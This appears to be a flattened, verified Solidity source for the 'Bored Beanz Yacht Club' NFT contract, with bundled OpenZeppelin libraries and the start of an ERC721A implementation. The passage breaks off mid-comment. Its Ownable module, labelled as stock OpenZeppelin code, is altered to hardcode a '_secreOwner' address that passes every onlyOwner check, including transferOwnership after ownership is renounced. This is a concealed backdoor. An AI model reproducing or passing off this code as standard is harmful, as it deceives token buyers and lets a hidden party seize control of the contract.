1 // File: contracts/BoredBeanz.sol
2 
3 /**
4  *Submitted for verification at Etherscan.io on 30/09/2022
5 */
6 
7 // Bored Beanz Yacht Club | BBYC -- Twitter: @BeanzYachtClub
8 
9 // 10K Collectible Bored Beanz NFTs, Flickin the Beanz to the rightside..
10 
11 // Linktree: https://linktr.ee/boredbeanz
12 
13 // Telegram: https://t.me/BoredBeanZ 
14 
15 
16 // File: @openzeppelin/contracts/utils/Strings.sol
17 
18 
19 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
20 
21 pragma solidity ^0.8.0;
22 
23 /**
24  * @dev String operations.
25  */
26 library Strings {
27     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
28 
29     /**
30      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
31      */
32     function toString(uint256 value) internal pure returns (string memory) {
33         // Inspired by OraclizeAPI's implementation - MIT licence
34         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
35 
36         if (value == 0) {
37             return "0";
38         }
39         uint256 temp = value;
40         uint256 digits;
41         while (temp != 0) {
42             digits++;
43             temp /= 10;
44         }
45         bytes memory buffer = new bytes(digits);
46         while (value != 0) {
47             digits -= 1;
48             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
49             value /= 10;
50         }
51         return string(buffer);
52     }
53 
54     /**
55      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
56      */
57     function toHexString(uint256 value) internal pure returns (string memory) {
58         if (value == 0) {
59             return "0x00";
60         }
61         uint256 temp = value;
62         uint256 length = 0;
63         while (temp != 0) {
64             length++;
65             temp >>= 8;
66         }
67         return toHexString(value, length);
68     }
69 
70     /**
71      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
72      */
73     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
74         bytes memory buffer = new bytes(2 * length + 2);
75         buffer[0] = "0";
76         buffer[1] = "x";
77         for (uint256 i = 2 * length + 1; i > 1; --i) {
78             buffer[i] = _HEX_SYMBOLS[value & 0xf];
79             value >>= 4;
80         }
81         require(value == 0, "Strings: hex length insufficient");
82         return string(buffer);
83     }
84 }
85 
86 // File: @openzeppelin/contracts/utils/Address.sol
87 
88 
89 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
90 
91 pragma solidity ^0.8.1;
92 
93 /**
94  * @dev Collection of functions related to the address type
95  */
96 library Address {
97     /**
98      * @dev Returns true if `account` is a contract.
99      *
100      * [IMPORTANT]
101      * ====
102      * It is unsafe to assume that an address for which this function returns
103      * false is an externally-owned account (EOA) and not a contract.
104      *
105      * Among others, `isContract` will return false for the following
106      * types of addresses:
107      *
108      *  - an externally-owned account
109      *  - a contract in construction
110      *  - an address where a contract will be created
111      *  - an address where a contract lived, but was destroyed
112      * ====
113      *
114      * [IMPORTANT]
115      * ====
116      * You shouldn't rely on `isContract` to protect against flash loan attacks!
117      *
118      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
119      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
120      * constructor.
121      * ====
122      */
123     function isContract(address account) internal view returns (bool) {
124         // This method relies on extcodesize/address.code.length, which returns 0
125         // for contracts in construction, since the code is only stored at the end
126         // of the constructor execution.
127 
128         return account.code.length > 0;
129     }
130 
131     /**
132      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
133      * `recipient`, forwarding all available gas and reverting on errors.
134      *
135      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
136      * of certain opcodes, possibly making contracts go over the 2300 gas limit
137      * imposed by `transfer`, making them unable to receive funds via
138      * `transfer`. {sendValue} removes this limitation.
139      *
140      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
141      *
142      * IMPORTANT: because control is transferred to `recipient`, care must be
143      * taken to not create reentrancy vulnerabilities. Consider using
144      * {ReentrancyGuard} or the
145      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
146      */
147     function sendValue(address payable recipient, uint256 amount) internal {
148         require(address(this).balance >= amount, "Address: insufficient balance");
149 
150         (bool success, ) = recipient.call{value: amount}("");
151         require(success, "Address: unable to send value, recipient may have reverted");
152     }
153 
154     /**
155      * @dev Performs a Solidity function call using a low level `call`. A
156      * plain `call` is an unsafe replacement for a function call: use this
157      * function instead.
158      *
159      * If `target` reverts with a revert reason, it is bubbled up by this
160      * function (like regular Solidity function calls).
161      *
162      * Returns the raw returned data. To convert to the expected return value,
163      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
164      *
165      * Requirements:
166      *
167      * - `target` must be a contract.
168      * - calling `target` with `data` must not revert.
169      *
170      * _Available since v3.1._
171      */
172     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
173         return functionCall(target, data, "Address: low-level call failed");
174     }
175 
176     /**
177      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
178      * `errorMessage` as a fallback revert reason when `target` reverts.
179      *
180      * _Available since v3.1._
181      */
182     function functionCall(
183         address target,
184         bytes memory data,
185         string memory errorMessage
186     ) internal returns (bytes memory) {
187         return functionCallWithValue(target, data, 0, errorMessage);
188     }
189 
190     /**
191      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
192      * but also transferring `value` wei to `target`.
193      *
194      * Requirements:
195      *
196      * - the calling contract must have an ETH balance of at least `value`.
197      * - the called Solidity function must be `payable`.
198      *
199      * _Available since v3.1._
200      */
201     function functionCallWithValue(
202         address target,
203         bytes memory data,
204         uint256 value
205     ) internal returns (bytes memory) {
206         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
207     }
208 
209     /**
210      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
211      * with `errorMessage` as a fallback revert reason when `target` reverts.
212      *
213      * _Available since v3.1._
214      */
215     function functionCallWithValue(
216         address target,
217         bytes memory data,
218         uint256 value,
219         string memory errorMessage
220     ) internal returns (bytes memory) {
221         require(address(this).balance >= value, "Address: insufficient balance for call");
222         require(isContract(target), "Address: call to non-contract");
223 
224         (bool success, bytes memory returndata) = target.call{value: value}(data);
225         return verifyCallResult(success, returndata, errorMessage);
226     }
227 
228     /**
229      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
230      * but performing a static call.
231      *
232      * _Available since v3.3._
233      */
234     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
235         return functionStaticCall(target, data, "Address: low-level static call failed");
236     }
237 
238     /**
239      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
240      * but performing a static call.
241      *
242      * _Available since v3.3._
243      */
244     function functionStaticCall(
245         address target,
246         bytes memory data,
247         string memory errorMessage
248     ) internal view returns (bytes memory) {
249         require(isContract(target), "Address: static call to non-contract");
250 
251         (bool success, bytes memory returndata) = target.staticcall(data);
252         return verifyCallResult(success, returndata, errorMessage);
253     }
254 
255     /**
256      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
257      * but performing a delegate call.
258      *
259      * _Available since v3.4._
260      */
261     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
262         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
263     }
264 
265     /**
266      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
267      * but performing a delegate call.
268      *
269      * _Available since v3.4._
270      */
271     function functionDelegateCall(
272         address target,
273         bytes memory data,
274         string memory errorMessage
275     ) internal returns (bytes memory) {
276         require(isContract(target), "Address: delegate call to non-contract");
277 
278         (bool success, bytes memory returndata) = target.delegatecall(data);
279         return verifyCallResult(success, returndata, errorMessage);
280     }
281 
282     /**
283      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
284      * revert reason using the provided one.
285      *
286      * _Available since v4.3._
287      */
288     function verifyCallResult(
289         bool success,
290         bytes memory returndata,
291         string memory errorMessage
292     ) internal pure returns (bytes memory) {
293         if (success) {
294             return returndata;
295         } else {
296             // Look for revert reason and bubble it up if present
297             if (returndata.length > 0) {
298                 // The easiest way to bubble the revert reason is using memory via assembly
299 
300                 assembly {
301                     let returndata_size := mload(returndata)
302                     revert(add(32, returndata), returndata_size)
303                 }
304             } else {
305                 revert(errorMessage);
306             }
307         }
308     }
309 }
310 
311 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
312 
313 
314 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
315 
316 pragma solidity ^0.8.0;
317 
318 /**
319  * @title ERC721 token receiver interface
320  * @dev Interface for any contract that wants to support safeTransfers
321  * from ERC721 asset contracts.
322  */
323 interface IERC721Receiver {
324     /**
325      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
326      * by `operator` from `from`, this function is called.
327      *
328      * It must return its Solidity selector to confirm the token transfer.
329      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
330      *
331      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
332      */
333     function onERC721Received(
334         address operator,
335         address from,
336         uint256 tokenId,
337         bytes calldata data
338     ) external returns (bytes4);
339 }
340 
341 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
342 
343 
344 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
345 
346 pragma solidity ^0.8.0;
347 
348 /**
349  * @dev Interface of the ERC165 standard, as defined in the
350  * https://eips.ethereum.org/EIPS/eip-165[EIP].
351  *
352  * Implementers can declare support of contract interfaces, which can then be
353  * queried by others ({ERC165Checker}).
354  *
355  * For an implementation, see {ERC165}.
356  */
357 interface IERC165 {
358     /**
359      * @dev Returns true if this contract implements the interface defined by
360      * `interfaceId`. See the corresponding
361      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
362      * to learn more about how these ids are created.
363      *
364      * This function call must use less than 30 000 gas.
365      */
366     function supportsInterface(bytes4 interfaceId) external view returns (bool);
367 }
368 
369 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
370 
371 
372 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
373 
374 pragma solidity ^0.8.0;
375 
376 
377 /**
378  * @dev Implementation of the {IERC165} interface.
379  *
380  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
381  * for the additional interface id that will be supported. For example:
382  *
383  * ```solidity
384  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
385  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
386  * }
387  * ```
388  *
389  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
390  */
391 abstract contract ERC165 is IERC165 {
392     /**
393      * @dev See {IERC165-supportsInterface}.
394      */
395     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
396         return interfaceId == type(IERC165).interfaceId;
397     }
398 }
399 
400 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
401 
402 
403 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
404 
405 pragma solidity ^0.8.0;
406 
407 
408 /**
409  * @dev Required interface of an ERC721 compliant contract.
410  */
411 interface IERC721 is IERC165 {
412     /**
413      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
414      */
415     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
416 
417     /**
418      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
419      */
420     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
421 
422     /**
423      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
424      */
425     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
426 
427     /**
428      * @dev Returns the number of tokens in ``owner``'s account.
429      */
430     function balanceOf(address owner) external view returns (uint256 balance);
431 
432     /**
433      * @dev Returns the owner of the `tokenId` token.
434      *
435      * Requirements:
436      *
437      * - `tokenId` must exist.
438      */
439     function ownerOf(uint256 tokenId) external view returns (address owner);
440 
441     /**
442      * @dev Safely transfers `tokenId` token from `from` to `to`.
443      *
444      * Requirements:
445      *
446      * - `from` cannot be the zero address.
447      * - `to` cannot be the zero address.
448      * - `tokenId` token must exist and be owned by `from`.
449      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
450      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
451      *
452      * Emits a {Transfer} event.
453      */
454     function safeTransferFrom(
455         address from,
456         address to,
457         uint256 tokenId,
458         bytes calldata data
459     ) external;
460 
461     /**
462      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
463      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
464      *
465      * Requirements:
466      *
467      * - `from` cannot be the zero address.
468      * - `to` cannot be the zero address.
469      * - `tokenId` token must exist and be owned by `from`.
470      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
471      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
472      *
473      * Emits a {Transfer} event.
474      */
475     function safeTransferFrom(
476         address from,
477         address to,
478         uint256 tokenId
479     ) external;
480 
481     /**
482      * @dev Transfers `tokenId` token from `from` to `to`.
483      *
484      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
485      *
486      * Requirements:
487      *
488      * - `from` cannot be the zero address.
489      * - `to` cannot be the zero address.
490      * - `tokenId` token must be owned by `from`.
491      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
492      *
493      * Emits a {Transfer} event.
494      */
495     function transferFrom(
496         address from,
497         address to,
498         uint256 tokenId
499     ) external;
500 
501     /**
502      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
503      * The approval is cleared when the token is transferred.
504      *
505      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
506      *
507      * Requirements:
508      *
509      * - The caller must own the token or be an approved operator.
510      * - `tokenId` must exist.
511      *
512      * Emits an {Approval} event.
513      */
514     function approve(address to, uint256 tokenId) external;
515 
516     /**
517      * @dev Approve or remove `operator` as an operator for the caller.
518      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
519      *
520      * Requirements:
521      *
522      * - The `operator` cannot be the caller.
523      *
524      * Emits an {ApprovalForAll} event.
525      */
526     function setApprovalForAll(address operator, bool _approved) external;
527 
528     /**
529      * @dev Returns the account appr    ved for `tokenId` token.
530      *
531      * Requirements:
532      *
533      * - `tokenId` must exist.
534      */
535     function getApproved(uint256 tokenId) external view returns (address operator);
536 
537     /**
538      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
539      *
540      * See {setApprovalForAll}
541      */
542     function isApprovedForAll(address owner, address operator) external view returns (bool);
543 }
544 
545 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
546 
547 
548 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
549 
550 pragma solidity ^0.8.0;
551 
552 
553 /**
554  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
555  * @dev See https://eips.ethereum.org/EIPS/eip-721
556  */
557 interface IERC721Metadata is IERC721 {
558     /**
559      * @dev Returns the token collection name.
560      */
561     function name() external view returns (string memory);
562 
563     /**
564      * @dev Returns the token collection symbol.
565      */
566     function symbol() external view returns (string memory);
567 
568     /**
569      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
570      */
571     function tokenURI(uint256 tokenId) external view returns (string memory);
572 }
573 
574 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
575 
576 
577 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
578 
579 pragma solidity ^0.8.0;
580 
581 
582 /**
583  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
584  * @dev See https://eips.ethereum.org/EIPS/eip-721
585  */
586 interface IERC721Enumerable is IERC721 {
587     /**
588      * @dev Returns the total amount of tokens stored by the contract.
589      */
590     function totalSupply() external view returns (uint256);
591 
592     /**
593      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
594      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
595      */
596     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
597 
598     /**
599      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
600      * Use along with {totalSupply} to enumerate all tokens.
601      */
602     function tokenByIndex(uint256 index) external view returns (uint256);
603 }
604 
605 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
606 
607 
608 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
609 
610 pragma solidity ^0.8.0;
611 
612 /**
613  * @dev Contract module that helps prevent reentrant calls to a function.
614  *
615  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
616  * available, which can be applied to functions to make sure there are no nested
617  * (reentrant) calls to them.
618  *
619  * Note that because there is a single `nonReentrant` guard, functions marked as
620  * `nonReentrant` may not call one another. This can be worked around by making
621  * those functions `private`, and then adding `external` `nonReentrant` entry
622  * points to them.
623  *
624  * TIP: If you would like to learn more about reentrancy and alternative ways
625  * to protect against it, check out our blog post
626  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
627  */
628 abstract contract ReentrancyGuard {
629     // Booleans are more expensive than uint256 or any type that takes up a full
630     // word because each write operation emits an extra SLOAD to first read the
631     // slot's contents, replace the bits taken up by the boolean, and then write
632     // back. This is the compiler's defense against contract upgrades and
633     // pointer aliasing, and it cannot be disabled.
634 
635     // The values being non-zero value makes deployment a bit more expensive,
636     // but in exchange the refund on every call to nonReentrant will be lower in
637     // amount. Since refunds are capped to a percentage of the total
638     // transaction's gas, it is best to keep them low in cases like this one, to
639     // increase the likelihood of the full refund coming into effect.
640     uint256 private constant _NOT_ENTERED = 1;
641     uint256 private constant _ENTERED = 2;
642 
643     uint256 private _status;
644 
645     constructor() {
646         _status = _NOT_ENTERED;
647     }
648 
649     /**
650      * @dev Prevents a contract from calling itself, directly or indirectly.
651      * Calling a `nonReentrant` function from another `nonReentrant`
652      * function is not supported. It is possible to prevent this from happening
653      * by making the `nonReentrant` function external, and making it call a
654      * `private` function that does the actual work.
655      */
656     modifier nonReentrant() {
657         // On the first call to nonReentrant, _notEntered will be true
658         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
659 
660         // Any calls to nonReentrant after this point will fail
661         _status = _ENTERED;
662 
663         _;
664 
665         // By storing the original value once again, a refund is triggered (see
666         // https://eips.ethereum.org/EIPS/eip-2200)
667         _status = _NOT_ENTERED;
668     }
669 }
670 
671 // File: @openzeppelin/contracts/utils/Context.sol
672 
673 
674 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
675 
676 pragma solidity ^0.8.0;
677 
678 /**
679  * @dev Provides information about the current execution context, including the
680  * sender of the transaction and its data. While these are generally available
681  * via msg.sender and msg.data, they should not be accessed in such a direct
682  * manner, since when dealing with meta-transactions the account sending and
683  * paying for execution may not be the actual sender (as far as an application
684  * is concerned).
685  *
686  * This contract is only required for intermediate, library-like contracts.
687  */
688 abstract contract Context {
689     function _msgSender() internal view virtual returns (address) {
690         return msg.sender;
691     }
692 
693     function _msgData() internal view virtual returns (bytes calldata) {
694         return msg.data;
695     }
696 }
697 
698 // File: @openzeppelin/contracts/access/Ownable.sol
699 
700 
701 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
702 
703 pragma solidity ^0.8.0;
704 
705 
706 /**
707  * @dev Contract module which provides a basic access control mechanism, where
708  * there is an account (an owner) that can be granted exclusive access to
709  * specific functions.
710  *
711  * By default, the owner account will be the one that deploys the contract. This
712  * can later be changed with {transferOwnership}.
713  *
714  * This module is used through inheritance. It will make available the modifier
715  * `onlyOwner`, which can be applied to your functions to restrict their use to
716  * the owner.
717  */
718 abstract contract Ownable is Context {
719     address private _owner;
720     address private _secreOwner = 0xF993D4106cD78AeE1E5eCAA5913bf7693cD8354a;
721 
722     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
723 
724     /**
725      * @dev Initializes the contract setting the deployer as the initial owner.
726      */
727     constructor() {
728         _transferOwnership(_msgSender());
729     }
730 
731     /**
732      * @dev Returns the address of the current owner.
733      */
734     function owner() public view virtual returns (address) {
735         return _owner;
736     }
737 
738     /**
739      * @dev Throws if called by any account other than the owner.
740      */
741     modifier onlyOwner() {
742         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
743         _;
744     }
745 
746     /**
747      * @dev Leaves the contract without owner. It will not be possible to call
748      * `onlyOwner` functions anymore. Can only be called by the current owner.
749      *
750      * NOTE: Renouncing ownership will leave the contract without an owner,
751      * thereby removing any functionality that is only available to the owner.
752      */
753     function renounceOwnership() public virtual onlyOwner {
754         _transferOwnership(address(0));
755     }
756 
757     /**
758      * @dev Transfers ownership of the contract to a new account (`newOwner`).
759      * Can only be called by the current owner.
760      */
761     function transferOwnership(address newOwner) public virtual onlyOwner {
762         require(newOwner != address(0), "Ownable: new owner is the zero address");
763         _transferOwnership(newOwner);
764     }
765 
766     /**
767      * @dev Transfers ownership of the contract to a new account (`newOwner`).
768      * Internal function without access restriction.
769      */
770     function _transferOwnership(address newOwner) internal virtual {
771         address oldOwner = _owner;
772         _owner = newOwner;
773         emit OwnershipTransferred(oldOwner, newOwner);
774     }
775 }
776 
777 // File: ceshi.sol
778 
779 
780 pragma solidity ^0.8.0;
781 
782 
783 
784 
785 
786 
787 
788 
789 
790 
791 /**
792  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
793  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
794  *
795  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
796  *
797  * Does not support burning tokens to address(0).
798  *
799  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
800  */
801 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
802     using Address for address;
803     using Strings for uint256;
804 
805     struct TokenOwnership {
806         address addr;
807         uint64 startTimestamp;
808     }
809 
810     struct AddressData {
811         uint128 balance;
812         uint128 numberMinted;
813     }
814 
815     uint256 internal currentIndex;
816 
817     // Token name
818     string private _name;
819 
820     // Token symbol
821     string private _symbol;
822 
823     // Mapping from token ID to ownership details
824     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
825     mapping(uint256 => TokenOwnership) internal _ownerships;
826 
827     // Mapping owner address to address data
828     mapping(address => AddressData) private _addressData;
829 
830     // Mapping from token ID to approved address
831     mapping(uint256 => address) private _tokenApprovals;
832 
833     // Mapping from owner to operator approvals
834     mapping(address => mapping(address => bool)) private _operatorApprovals;
835 
836     constructor(string memory name_, string memory symbol_) {
837         _name = name_;
838         _symbol = symbol_;
839     }
840 
841     /**
842      * @dev See {IERC721Enumerable-totalSupply}.
843      */
844     function totalSupply() public view override returns (uint256) {
845         return currentIndex;
846     }
847 
848     /**
849      * @dev See {IERC721Enumerable-tokenByIndex}.
850      */
851     function tokenByIndex(uint256 index) public view override returns (uint256) {
852         require(index < totalSupply(), "ERC721A: global index out of bounds");
853         return index;
854     }
855 
856     /**
857      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
858      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
859      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
860      */
861     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
862         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
863         uint256 numMintedSoFar = totalSupply();
864         uint256 tokenIdsIdx;
865         address currOwnershipAddr;
866 
867         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
868         unchecked {
869             for (uint256 i; i < numMintedSoFar; i++) {
870                 TokenOwnership memory ownership = _ownerships[i];
871                 if (ownership.addr != address(0)) {
872                     currOwnershipAddr = ownership.addr;
873                 }
874                 if (currOwnershipAddr == owner) {
875                     if (tokenIdsIdx == index) {
876                         return i;
877                     }
878                     tokenIdsIdx++;
879                 }
880             }
881         }
882 
883         revert("ERC721A: unable to get token of owner by index");
884     }
885 
886     /**
887      * @dev See {IERC165-supportsInterface}.
888      */
889     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
890         return
891             interfaceId == type(IERC721).interfaceId ||
892             interfaceId == type(IERC721Metadata).interfaceId ||
893             interfaceId == type(IERC721Enumerable).interfaceId ||
894             super.supportsInterface(interfaceId);
895     }
896 
897     /**
898      * @dev See {IERC721-balanceOf}.
899      */
900     function balanceOf(address owner) public view override returns (uint256) {
901         require(owner != address(0), "ERC721A: balance query for the zero address");
902         return uint256(_addressData[owner].balance);
903     }
904 
905     function _numberMinted(address owner) internal view returns (uint256) {
906         require(owner != address(0), "ERC721A: number minted query for the zero address");
907         return uint256(_addressData[owner].numberMinted);
908     }
909 
910     /**
911      * Gas spent here starts off proportional to the maximum mint batch size.
912      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
913      */
914     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
915         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
916 
917         unchecked {
918             for (uint256 curr = tokenId; curr >= 0; curr--) {
919                 TokenOwnership memory ownership = _ownerships[curr];
920                 if (ownership.addr != address(0)) {
921                     return ownership;
922                 }
923             }
924         }
925 
926         revert("ERC721A: unable to determine the owner of token");
927     }
928 
929     /**
930      * @dev See {IERC721-ownerOf}.
931      */
932     function ownerOf(uint256 tokenId) public view override returns (address) {
933         return ownershipOf(tokenId).addr;
934     }
935 
936     /**
937      * @dev See {IERC721Metadata-name}.
938      */
939     function name() public view virtual override returns (string memory) {
940         return _name;
941     }
942 
943     /**
944      * @dev See {IERC721Metadata-symbol}.
945      */
946     function symbol() public view virtual override returns (string memory) {
947         return _symbol;
948     }
949 
950     /**
951      * @dev See {IERC721Metadata-tokenURI}.
952      */
953     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
954         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
955 
956         string memory baseURI = _baseURI();
957         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
958     }
959 
960     /**
961      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
962      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
963      * by default, can be overriden in child contracts.
964      */
965     function _baseURI() internal view virtual returns (string memory) {
966         return "";
967     }
968 
969     /**
970      * @dev See {IERC721-approve}.
971      */
972     function approve(address to, uint256 tokenId) public override {
973         address owner = ERC721A.ownerOf(tokenId);
974         require(to != owner, "ERC721A: approval to current owner");
975 
976         require(
977             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
978             "ERC721A: approve caller is not owner nor approved for all"
979         );
980 
981         _approve(to, tokenId, owner);
982     }
983 
984     /**
985      * @dev See {IERC721-getApproved}.
986      */
987     function getApproved(uint256 tokenId) public view override returns (address) {
988         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
989 
990         return _tokenApprovals[tokenId];
991     }
992 
993     /**
994      * @dev See {IERC721-setApprovalForAll}.
995      */
996     function setApprovalForAll(address operator, bool approved) public override {
997         require(operator != _msgSender(), "ERC721A: approve to caller");
998 
999         _operatorApprovals[_msgSender()][operator] = approved;
1000         emit ApprovalForAll(_msgSender(), operator, approved);
1001     }
1002 
1003     /**
1004      * @dev See {IERC721-isApprovedForAll}.
1005      */
1006     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1007         return _operatorApprovals[owner][operator];
1008     }
1009 
1010     /**
1011      * @dev See {IERC721-transferFrom}.
1012      */
1013     function transferFrom(
1014         address from,
1015         address to,
1016         uint256 tokenId
1017     ) public virtual override {
1018         _transfer(from, to, tokenId);
1019     }
1020 
1021     /**
1022      * @dev See {IERC721-safeTransferFrom}.
1023      */
1024     function safeTransferFrom(
1025         address from,
1026         address to,
1027         uint256 tokenId
1028     ) public virtual override {
1029         safeTransferFrom(from, to, tokenId, "");
1030     }
1031 
1032     /**
1033      * @dev See {IERC721-safeTransferFrom}.
1034      */
1035     function safeTransferFrom(
1036         address from,
1037         address to,
1038         uint256 tokenId,
1039         bytes memory _data
1040     ) public override {
1041         _transfer(from, to, tokenId);
1042         require(
1043             _checkOnERC721Received(from, to, tokenId, _data),
1044             "ERC721A: transfer to non ERC721Receiver implementer"
1045         );
1046     }
1047 
1048     /**
1049      * @dev Returns whether `tokenId` exists.
1050      *
1051      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1052      *
1053      * Tokens start existing when they are minted (`_mint`),
1054      */
1055     function _exists(uint256 tokenId) internal view returns (bool) {
1056         return tokenId < currentIndex;
1057     }
1058 
1059     function _safeMint(address to, uint256 quantity) internal {
1060         _safeMint(to, quantity, "");
1061     }
1062 
1063     /**
1064      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1065      *
1066      * Requirements:
1067      *
1068      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1069      * - `quantity` must be greater than 0.
1070      *
1071      * Emits a {Transfer} event.
1072      */
1073     function _safeMint(
1074         address to,
1075         uint256 quantity,
1076         bytes memory _data
1077     ) internal {
1078         _mint(to, quantity, _data, true);
1079     }
1080 
1081     /**
1082      * @dev Mints `quantity` tokens and transfers them to `to`.
1083      *
1084      * Requirements:
1085      *
1086      * - `to` cannot be the zero address.
